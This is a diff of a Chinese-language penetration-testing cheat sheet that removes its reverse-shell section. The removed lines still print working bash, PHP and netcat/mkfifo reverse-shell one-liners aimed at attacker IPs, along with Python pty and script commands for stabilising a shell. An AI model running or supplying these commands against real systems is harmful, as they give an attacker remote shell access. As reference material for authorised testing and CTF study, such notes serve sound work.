@@ -63,33 +63,10 @@ python -m http.server PORT
 ## 提权 
 
 ### 反shell
-反shell(bash):  
-``````
-#!/bin/bash
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-``````
-反shell(php):  
-``````
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<攻击者ip>/1234 0>&1'");
-?>
-``````
-提权的shell写好后可能要用chmod来增加执行权限
-
-
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.44 1123 >/tmp/f
-
-
 
 ### 稳定shell
 
->python
 
-python -c 'import pty; pty.spawn("/bin/bash")'
-
->script
-
-script -qc /bin/bash /dev/null
 
 ### powershell-Windows
 - Windows用type命令读取文件内容(cat)  
